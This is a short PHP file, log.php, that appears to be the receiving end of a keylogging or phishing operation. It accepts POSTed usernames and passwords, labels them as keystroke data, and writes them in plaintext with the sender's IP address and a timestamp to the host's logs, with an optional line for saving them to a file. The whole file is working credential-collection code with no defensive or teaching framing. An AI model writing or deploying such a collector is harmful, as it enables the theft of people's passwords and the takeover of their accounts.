<?php
// log.php – receives keystroke data and logs it to Render

// Only accept POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the raw JSON input
    $data = json_decode(file_get_contents('php://input'), true);
    
    $username = isset($data['username']) ? $data['username'] : '';
    $password = isset($data['password']) ? $data['password'] : '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    
    // Create a log message
    $log = "[KEYSTROKE] Username: $username | Password: $password | IP: $ip | Time: " . date('Y-m-d H:i:s');
    
    // Write to Render logs
    error_log($log);
    
    // Also save to a file if you want (optional)
    // file_put_contents('keystrokes.log', $log . "\n", FILE_APPEND);
    
    // Respond with success
    http_response_code(200);
    echo json_encode(['status' => 'ok']);
    exit;
}

// If not POST, return 405
http_response_code(405);
echo 'Method Not Allowed';
?>
